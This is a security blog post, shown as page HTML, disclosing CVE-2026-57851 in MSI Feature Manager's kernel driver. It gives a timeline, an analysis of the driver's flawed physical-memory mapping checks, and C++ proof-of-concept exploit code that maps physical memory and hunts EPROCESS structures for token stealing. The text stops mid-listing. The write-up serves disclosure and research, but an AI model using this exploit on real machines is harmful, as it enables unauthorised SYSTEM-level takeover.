@@ -1,0 +1,614 @@
+
+<!DOCTYPE html>
+<html lang="en" class="dark light">
+
+    
+<head>
+    
+
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="base" content="https://readmsr.github.io" />
+
+    
+
+    
+
+    
+    
+    
+        <title>
+            
+                CVE-2026–57851 — Exploiting MSI Feature Manager Driver: Physical Memory and I/O Port Abuse for Privilege Escalation
+            
+        </title>
+
+        
+            <meta property="og:title"
+                  content="CVE-2026–57851 — Exploiting MSI Feature Manager Driver: Physical Memory and I/O Port Abuse for Privilege Escalation" />
+        
+    
+
+    
+        
+    
+
+    
+        
+    
+
+    
+    
+        <link rel="icon"
+              type="image/png"
+              href="https://readmsr.github.io/icon/favicon.png" />
+    
+
+    
+    
+        <link href=https://readmsr.github.io/fonts.css rel="stylesheet" />
+    
+
+    
+    
+
+    
+    
+        <script defer src=https://readmsr.github.io/js/codeblock.js></script>
+    
+
+    
+    
+        <script defer src=https://readmsr.github.io/js/toc.js></script>
+    
+
+    
+    
+        <script defer src=https://readmsr.github.io/js/note.js></script>
+    
+
+    
+        <script>
+            MathJax = {
+                tex: {
+                    inlineMath: [
+                        ['$', '$'],
+                        ['\\(', '\\)']
+                    ]
+                }
+            };
+        </script>
+        <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js">
+        </script>
+    
+
+    
+    
+
+
+    
+
+    
+    
+
+    
+    
+        <link rel="stylesheet"
+              type="text/css"
+              href="https://readmsr.github.io/theme/light.css" />
+        <link id="darkModeStyle"
+              rel="stylesheet"
+              type="text/css"
+              href="https://readmsr.github.io/theme/dark.css" />
+    
+
+    
+        
+            <script>
+                var themeToggleMode = "toggle";
+            </script>
+        
+        <script src=https://readmsr.github.io/js/themetoggle.js></script>
+
+        
+            <script>
+                setTheme(getSavedTheme());
+            </script>
+        
+    
+
+
+    <link rel="stylesheet"
+          type="text/css"
+          media="screen"
+          href="https://readmsr.github.io/main.css" />
+
+    
+
+    <script defer
+                    src="https://readmsr.github.io/search_index.en.js?h=1afd503c4c6c6450da7c"></script>
+        <script defer
+                src="https://readmsr.github.io/js/searchElasticlunr.min.js?h=3626c0ef99daa745b31e"></script>
+
+</head>
+
+
+    <body>
+        
+
+        <div class="left-content">
+            
+            
+        </div>
+
+        <div class="content">
+            <nav>
+    <div class="left-nav">
+        
+            <a href=https://readmsr.github.io>readmsr</a>
+        
+
+
+        <div class="socials">
+            
+                
+            
+            
+                <a rel='me' href="https://github.com/readmsr/" title="readmsr" class="social">
+                    <img alt="readmsr"
+                         src="https://readmsr.github.io/icons/social/github.svg" />
+                </a>
+            
+                <a rel='me' href="#" title="kegarenakiyume" class="social">
+                    <img alt="kegarenakiyume"
+                         src="https://readmsr.github.io/icons/social/discord.svg" />
+                </a>
+            
+        </div>
+    </div>
+
+    <div class="right-nav">
+        
+            <a href=https://readmsr.github.io/posts style="margin-right: 0.5em">/posts</a>
+        
+
+        
+            <button id="search-button"
+                    class="search-button"
+                    title="$SHORTCUT to open search">
+                <img src="https://readmsr.github.io/icons/search.svg"
+                     alt="Search"
+                     class="search-icon" />
+            </button>
+
+            <div id="searchModal"
+                 class="search-modal js"
+                 role="dialog"
+                 aria-labelledby="modalTitle">
+                <div id="modal-content">
+                    <h1 id="modalTitle" class="page-header">
+                        Search
+                    </h1>
+                    <div id="searchBar">
+                        <input id="searchInput"
+                               role="combobox"
+                               autocomplete="off"
+                               spellcheck="false"
+                               aria-expanded="false"
+                               aria-controls="results-container"
+                               placeholder="Search..." />
+                        <button id="clear-search" class="clear-button" title="Clear search">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960">
+                                <path d="m256-200-56-56 224-224-224-224 56-56 224 224 224-224 56 56-224 224 224 224-56 56-224-224-224 224Z" />
+                            </svg>
+                        </button>
+                    </div>
+                    <div id="results-container">
+                        <div id="results-info">
+                            <span id="zero_results" style="display: none;">No results</span>
+                            <span id="one_result" style="display: none;">1 result</span>
+                            <span id="many_results" style="display: none;">$NUMBER results</span>
+                        </div>
+                        <div id="results" role="listbox">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        
+
+        
+        
+            <a id="dark-mode-toggle"
+               onclick="toggleTheme(); event.preventDefault();"
+               href="#">
+                <img src="https://readmsr.github.io/icons/sun.svg" id="sun-icon" alt="Light" />
+                <img src="https://readmsr.github.io/icons/moon.svg"
+                     id="moon-icon"
+                     style="filter: invert(1)"
+                     alt="Dark" />
+                
+            </a>
+
+            <!-- Initialize the theme toggle icons -->
+            <script>
+                updateItemToggleTheme()
+            </script>
+        
+    </div>
+</nav>
+
+
+            
+            
+    
+<div class="visible-element-observer-root" data-selector="main article p">
+    <main>
+        <article>
+            <div class="title">
+                
+                
+
+    <div class="page-header">
+        CVE-2026–57851 — Exploiting MSI Feature Manager Driver: Physical Memory and I/O Port Abuse for Privilege Escalation
+    </div>
+
+
+
+                <div class="meta">
+                    
+                        Posted on <time>2026-07-07</time>
+                    
+
+
+                    
+
+                    
+
+                    
+
+                    
+                    
+
+                    
+                    
+
+                    
+                    
+
+                    
+
+                </div>
+            </div>
+
+            
+
+            <section class="body">
+                <p><img src="/images/posts/msi_feature_manager_cve-1.png" alt="msi_feature_manager_cve-1" /></p>
+<h2 id="background"><a class="zola-anchor" href="#background" aria-label="Anchor link for: background">Background</a></h2>
+<p>After spending the last several months studying Windows internals and driver development, I decided to apply what I learned to a real-world target. After dozens of hours reading through the work of other researchers, I found out that hardware utility software is often vulnerable by design. Following that, I decided to check random software on my laptop and stumbled upon MSI Feature Manager. It is the utility software used to switch between performance modes and change keyboard lighting. I started analyzing the driver component in a static analysis tool, and it didn't take long to realize that the IOCTL validation was flawed by design, giving me a way to read and write to (almost) all physical memory and I/O ports.</p>
+<h2 id="disclosure-timeline"><a class="zola-anchor" href="#disclosure-timeline" aria-label="Anchor link for: disclosure-timeline">Disclosure Timeline</a></h2>
+<ul>
+<li><strong>12 May 2026:</strong> Vendor notified of the vulnerability</li>
+<li><strong>19 May 2026:</strong> Vendor acknowledged the vulnerability</li>
+<li><strong>17 June 2026:</strong> Vendor shares the patched build with the vulnerable driver removed — Submitted to VulnCheck for CVE assignment (vendor is not a CNA)</li>
+<li><strong>7 July 2026:</strong> CVE-2026–57851 assigned. (<a rel="external" href="https://www.cve.org/CVERecord?id=CVE-2026-57851">https://www.cve.org/CVERecord?id=CVE-2026-57851</a>)</li>
+</ul>
+<h2 id="vulnerability-overview"><a class="zola-anchor" href="#vulnerability-overview" aria-label="Anchor link for: vulnerability-overview">Vulnerability Overview</a></h2>
+<p>The vulnerability lives in the driver component of the software, KernCoreLib64.sys, a driver that has been timestamped since way back in 2018. The driver is a custom variant of WinIo, a well known vulnerable driver. Although the developers did implement some extra validation checks, they weren't enough to secure the driver. The driver exposes specific IOCTL handlers that allow any local, unprivileged user to perform arbitrary read and write operations on physical memory and I/O ports. While the physical memory access is restricted to addresses &gt;=3.94GB (0xFC000800), critical kernel components such as ntoskrnl.exe are frequently resident in memory regions above this boundary. This can lead to full local privilege escalation, DKOM, tampering of security software by directly patching kernel-mode callbacks and process structures. Furthermore, it can be leveraged to manually map custom unsigned kernel drivers if modern protections such as HVCI or VBS are off (which is planned to be covered in a future post). Access to I/O ports are completely unvalidated, making them fully accessible to any unprivileged process.</p>
+<h2 id="detailed-analysis-of-the-physical-memory-mapping-vulnerability"><a class="zola-anchor" href="#detailed-analysis-of-the-physical-memory-mapping-vulnerability" aria-label="Anchor link for: detailed-analysis-of-the-physical-memory-mapping-vulnerability">Detailed Analysis of the Physical Memory Mapping Vulnerability</a></h2>
+<p><img src="/images/posts/msi_feature_manager_cve-2.png" alt="msi_feature_manager_cve-2" /></p>
+<p>The imports looked promising. I knew ZwMapViewOfSection was commonly used to map a view of the \Device\PhysicalMemory object, so I immediately went to analyze how the driver handled it.</p>
+<p><img src="/images/posts/msi_feature_manager_cve-3.png" alt="msi_feature_manager_cve-3" /></p>
+<p>Above is the IOCTL dispatch function. I restructured the pseudo-code and commented the important code to illustrate the logic. The driver handles physical memory mapping requests via the IOCTL 0x80102040, which is designated for mapping physical memory into user space. The driver implements a strict bound check on the requested physical address. It checks whether the target address falls within the ranges 0xFC000800 – 0xFC0008FF or 0xFC000E00 – 0xFC000FFF. If the request is outside these boundaries, the IOCTL call returns with an error. While this check looks sufficient at first look, a dive inside the map_phys_memory function shows an exploitation primitive. As we must be in the boundaries to reach this function, our best choice is to supply 0xFC000800 as the base physical address.</p>
+<p><img src="/images/posts/msi_feature_manager_cve-4.png" alt="msi_feature_manager_cve-4" /></p>
+<p>Once the IOCTL handler is triggered, execution flows into the map_phys_memory function. It obtains a handle to the \Device\PhysicalMemory object, which is a Windows kernel section object that provides a way to map the entire pool of physical memory available on the system. Historically, this section object used to be accessible directly from user-mode. Starting with Windows Server 2003 SP1, Microsoft then restricted it to kernel-mode only.</p>
+<p><img src="/images/posts/msi_feature_manager_cve-5.png" alt="msi_feature_manager_cve-5" /></p>
+<p>The continuation of the function handles the mapping of physical memory into the calling process's address space. The core of the vulnerability lies within 7th parameter of ZwMapViewOfSection API.</p>
+<p><img src="/images/posts/msi_feature_manager_cve-6.png" alt="msi_feature_manager_cve-6" /></p>
+<p><img src="/images/posts/msi_feature_manager_cve-7.png" alt="msi_feature_manager_cve-7" /></p>
+<p>The driver does not validate this parameter before passing it to the kernel routine. By supplying a large enough value for the 7th parameter ViewSize (the maximum physical memory address minus 0xFC000800 in our case) , the caller can specify a range to map the system's entire physical memory above 0xFC000800 (&gt;=3.94GB). As the Windows kernel (ntoskrnl.exe) and the important structures are almost always resident above this limit, an attacker gains the capability to overwrite important kernel structures, patch kernel code on the fly, and achieve kernel-level code execution directly from user mode.</p>
+<h2 id="proof-of-concept-leveraging-physical-memory-access-for-process-token-manipulation"><a class="zola-anchor" href="#proof-of-concept-leveraging-physical-memory-access-for-process-token-manipulation" aria-label="Anchor link for: proof-of-concept-leveraging-physical-memory-access-for-process-token-manipulation">Proof of Concept: Leveraging Physical Memory Access for Process Token Manipulation</a></h2>
+<p>Below is a brief walkthrough highlighting the core logic of the exploit implementation to achieve full control over the OS by granting a user-mode process system level permissions (NT AUTHORITY\SYSTEM). For the complete source code, refer to the repository:</p>
+<p><a rel="external" href="https://github.com/readmsr/MSI_FeatureManager_CVE/blob/master/phys_mem/phys_mem.cpp">MSI_FeatureManager_CVE/phys_mem/phys_mem.cpp at master · readmsr/MSI_FeatureManager_CVE</a></p>
+<p>Obtaining the driver handle:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="cpp"><span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 1</span><span>HANDLE driver_handle</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;font-style: italic;"> CreateFileW</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">L&quot;</span><span style="color: #F5C2E7;">\\\\</span><span style="color: #A6E3A1;">.</span><span style="color: #F5C2E7;">\\</span><span style="color: #A6E3A1;">WinIo&quot;</span><span style="color: #9399B2;">,</span><span> GENERIC_READ</span><span style="color: #94E2D5;"> |</span><span> GENERIC_WRITE</span><span style="color: #9399B2;">,</span><span style="color: #FAB387;"> 3</span><span style="color: #9399B2;">,</span><span style="color: #F38BA8;"> nullptr</span><span style="color: #9399B2;">,</span><span style="color: #FAB387;"> 3</span><span style="color: #9399B2;">,</span><span> FILE_ATTRIBUTE_NORMAL</span><span style="color: #9399B2;">,</span><span style="color: #F38BA8;"> nullptr</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 2</span><span style="color: #CBA6F7;">if</span><span style="color: #9399B2;"> (</span><span>driver_handle</span><span style="color: #94E2D5;"> ==</span><span> INVALID_HANDLE_VALUE</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 3</span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 4</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[-] Failed to grab driver handle.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 5</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[*] Press enter to exit.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 6</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cin</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;font-style: italic;">get</span><span style="color: #9399B2;">();</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 7</span><span style="color: #CBA6F7;">    return</span><span style="color: #FAB387;"> 1</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 8</span><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 9</span><span style="color: #F9E2AF;">std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[+] Grabbed driver handle.</span><span style="color: #F5C2E7;">\n\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span></code></pre>
+<p>Retrieving the total size of installed physical memory, falling back to 8GB if an error occurs.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="cpp"><span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 1</span><span>ULONGLONG total_ram_kb</span><span style="color: #94E2D5;"> =</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 2</span><span>DWORD64 map_size</span><span style="color: #94E2D5;"> =</span><span> EIGHT_GB</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 3</span><span style="color: #CBA6F7;">if</span><span style="color: #9399B2;"> (</span><span style="color: #89B4FA;font-style: italic;">GetPhysicallyInstalledSystemMemory</span><span style="color: #9399B2;">(</span><span style="color: #94E2D5;">&amp;</span><span>total_ram_kb</span><span style="color: #9399B2;">))</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 4</span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 5</span><span>    map_size</span><span style="color: #94E2D5;"> =</span><span> total_ram_kb</span><span style="color: #94E2D5;"> *</span><span style="color: #FAB387;"> 1024</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 6</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[*] Physical RAM: &quot;</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #F9E2AF;"> std</span><span style="color: #9399B2;">::</span><span>dec</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #9399B2;"> (</span><span>total_ram_kb</span><span style="color: #94E2D5;"> /</span><span style="color: #9399B2;"> (</span><span style="color: #FAB387;">1024</span><span style="color: #94E2D5;"> *</span><span style="color: #FAB387;"> 1024</span><span style="color: #9399B2;">))</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot; GB (0x&quot;</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #F9E2AF;"> std</span><span style="color: #9399B2;">::</span><span>hex</span><span style="color: #94E2D5;"> &lt;&lt;</span><span> map_size</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot; bytes)</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 7</span><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 8</span><span style="color: #CBA6F7;">else</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 9</span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">10</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[-] Failed to get physical RAM size. Defaulting 8 GB.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">11</span><span style="color: #9399B2;">}</span></span></code></pre>
+<p>Once the vulnerable IOCTL triggers the map_phys_memory function, the exploit below maps the entire available physical memory into our user-mode virtual address space by abusing the driver's lack of argument validation. From there, it initiates a sequential physical memory walk, scanning the RAM in 8-byte increments to hunt for EPROCESS structures. The exploit filters valid structure candidates through heuristic validations. These validations confirm the structure's validity by verifying requirements such as valid kernel address boundaries and a page-aligned CR3 directory base. Whenever uninitialized physical memory holes trigger an exception, the exploit catches and rounds the offset to the next page boundary. As the exploit scans, it prints out the details for every discovered process and filters the physical memory addresses of the current user process and PID 4 (System) which are needed for the token-stealing primitive.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="cpp"><span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 1</span><span style="color: #F9E2AF;font-style: italic;">map_request</span><span> read_req</span><span style="color: #9399B2;">{};</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 2</span><span>read_req</span><span style="color: #9399B2;">.</span><span>size</span><span style="color: #94E2D5;"> =</span><span> map_size</span><span style="color: #94E2D5;"> -</span><span> PHYSICAL_READ_BASE</span><span style="color: #9399B2;">;</span><span style="color: #9399B2;font-style: italic;"> // ZwMapViewOfSection argument 7. no checks in the driver. can be used to map entire physical memory</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 3</span><span>read_req</span><span style="color: #9399B2;">.</span><span>phys_addr</span><span style="color: #94E2D5;"> =</span><span> PHYSICAL_READ_BASE</span><span style="color: #9399B2;">;</span><span style="color: #9399B2;font-style: italic;"> // lowest address in driver bound check</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 4</span><span style="color: #F9E2AF;">std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[*] Requesting memory map.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 5</span><span>DWORD bytes</span><span style="color: #94E2D5;"> =</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 6</span><span style="color: #CBA6F7;">if</span><span style="color: #9399B2;"> (</span><span style="color: #89B4FA;font-style: italic;">DeviceIoControl</span><span style="color: #9399B2;">(</span><span>driver_handle</span><span style="color: #9399B2;">,</span><span> IOCTL_MAP_PHYS_MEM</span><span style="color: #9399B2;">,</span><span style="color: #94E2D5;"> &amp;</span><span>read_req</span><span style="color: #9399B2;">,</span><span style="color: #94E2D5;"> sizeof</span><span style="color: #9399B2;">(</span><span>map_request</span><span style="color: #9399B2;">),</span><span style="color: #94E2D5;"> &amp;</span><span>read_req</span><span style="color: #9399B2;">,</span><span style="color: #94E2D5;"> sizeof</span><span style="color: #9399B2;">(</span><span>map_request</span><span style="color: #9399B2;">),</span><span style="color: #94E2D5;"> &amp;</span><span>bytes</span><span style="color: #9399B2;">,</span><span style="color: #F38BA8;"> NULL</span><span style="color: #9399B2;">))</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 7</span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 8</span><span style="color: #F9E2AF;font-style: italic;">    DWORD64</span><span> map_base_va</span><span style="color: #94E2D5;"> =</span><span> read_req</span><span style="color: #9399B2;">.</span><span>section_base_va</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 9</span><span style="color: #CBA6F7;">    if</span><span style="color: #9399B2;"> (</span><span>map_base_va</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">10</span><span style="color: #9399B2;">    {</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">11</span><span style="color: #F9E2AF;">        std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[+] Map base VA found at 0x&quot;</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #F9E2AF;"> std</span><span style="color: #9399B2;">::</span><span>hex</span><span style="color: #94E2D5;"> &lt;&lt;</span><span> map_base_va</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;. Starting physical memory walk.</span><span style="color: #F5C2E7;">\n\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">12</span><span style="color: #CBA6F7;">        int</span><span> found_count</span><span style="color: #94E2D5;"> =</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">13</span><span style="color: #F9E2AF;font-style: italic;">        DWORD64</span><span> end_offset</span><span style="color: #94E2D5;"> =</span><span> map_size</span><span style="color: #94E2D5;"> -</span><span> PHYSICAL_READ_BASE</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">14</span><span style="color: #CBA6F7;">        for</span><span style="color: #9399B2;"> (</span><span>DWORD64 offset</span><span style="color: #94E2D5;"> =</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">;</span><span> offset</span><span style="color: #94E2D5;"> &lt;</span><span> end_offset</span><span style="color: #9399B2;">;</span><span> offset</span><span style="color: #94E2D5;"> +=</span><span style="color: #FAB387;"> 8</span><span style="color: #9399B2;">)</span><span style="color: #9399B2;font-style: italic;"> // physical memory walk</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">15</span><span style="color: #9399B2;">        {</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">16</span><span style="color: #F9E2AF;font-style: italic;">            DWORD64</span><span> current_mapped_va</span><span style="color: #94E2D5;"> =</span><span> map_base_va</span><span style="color: #94E2D5;"> +</span><span> offset</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">17</span><span>            __try</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">18</span><span style="color: #9399B2;">            {</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">19</span><span style="color: #F9E2AF;font-style: italic;">                DWORD64</span><span> pid</span><span style="color: #94E2D5;"> = *</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">volatile</span><span> DWORD64</span><span style="color: #94E2D5;">*</span><span style="color: #9399B2;">)</span><span>current_mapped_va</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">20</span><span style="color: #CBA6F7;">                if</span><span style="color: #9399B2;"> (</span><span>pid</span><span style="color: #94E2D5;"> &gt;=</span><span style="color: #FAB387;"> 4</span><span style="color: #94E2D5;"> &amp;&amp;</span><span> pid</span><span style="color: #94E2D5;"> &lt;=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">A0000</span><span style="color: #94E2D5;"> &amp;&amp;</span><span style="color: #9399B2;"> (</span><span>pid</span><span style="color: #94E2D5;"> %</span><span style="color: #FAB387;"> 4</span><span style="color: #94E2D5;"> ==</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">))</span><span style="color: #9399B2;font-style: italic;"> // check if pid is valid and multiple of 4</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">21</span><span style="color: #9399B2;">                {</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">22</span><span style="color: #F9E2AF;font-style: italic;">                    DWORD64</span><span> eprocess_base</span><span style="color: #94E2D5;"> =</span><span> current_mapped_va</span><span style="color: #94E2D5;"> -</span><span> EPROCESS_UNIQUEPID_OFFSET</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">23</span><span style="color: #F9E2AF;font-style: italic;">                    DWORD64</span><span> exit_time</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;font-style: italic;"> read</span><span style="color: #9399B2;">&lt;</span><span style="color: #F9E2AF;font-style: italic;">DWORD64</span><span style="color: #9399B2;">&gt;(</span><span>eprocess_base</span><span style="color: #94E2D5;"> +</span><span> EPROCESS_EXITTIME_OFFSET</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">24</span><span style="color: #CBA6F7;">                    if</span><span style="color: #9399B2;"> (</span><span>exit_time</span><span style="color: #9399B2;">)</span><span style="color: #CBA6F7;"> continue</span><span style="color: #9399B2;">;</span><span style="color: #9399B2;font-style: italic;"> // if ExitTime != 0, the process has been terminated</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">25</span><span style="color: #F9E2AF;font-style: italic;">                    DWORD64</span><span> create_time</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;font-style: italic;"> read</span><span style="color: #9399B2;">&lt;</span><span style="color: #F9E2AF;font-style: italic;">DWORD64</span><span style="color: #9399B2;">&gt;(</span><span>eprocess_base</span><span style="color: #94E2D5;"> +</span><span> EPROCESS_CREATETIME_OFFSET</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">26</span><span style="color: #CBA6F7;">                    if</span><span style="color: #9399B2;"> (</span><span>create_time</span><span style="color: #94E2D5;"> &lt;</span><span> TIMESTAMP_MIN</span><span style="color: #94E2D5;"> ||</span><span> create_time</span><span style="color: #94E2D5;"> &gt;</span><span> TIMESTAMP_MAX</span><span style="color: #9399B2;">)</span><span style="color: #CBA6F7;"> continue</span><span style="color: #9399B2;">;</span><span style="color: #9399B2;font-style: italic;"> // check if CreateTime isn&#39;t in valid bounds</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">27</span><span style="color: #F9E2AF;font-style: italic;">                    DWORD64</span><span> flink</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;font-style: italic;"> read</span><span style="color: #9399B2;">&lt;</span><span style="color: #F9E2AF;font-style: italic;">DWORD64</span><span style="color: #9399B2;">&gt;(</span><span>eprocess_base</span><span style="color: #94E2D5;"> +</span><span> EPROCESS_ACTIVELINKS_OFFSET</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">28</span><span style="color: #CBA6F7;">                    if</span><span style="color: #9399B2;"> ((</span><span>flink</span><span style="color: #94E2D5;"> &amp;</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">FFFF000000000000</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> !=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">FFFF000000000000</span><span style="color: #9399B2;">)</span><span style="color: #CBA6F7;"> continue</span><span style="color: #9399B2;">;</span><span style="color: #9399B2;font-style: italic;"> // check if next list entry is not in valid kernel address space</span></span>
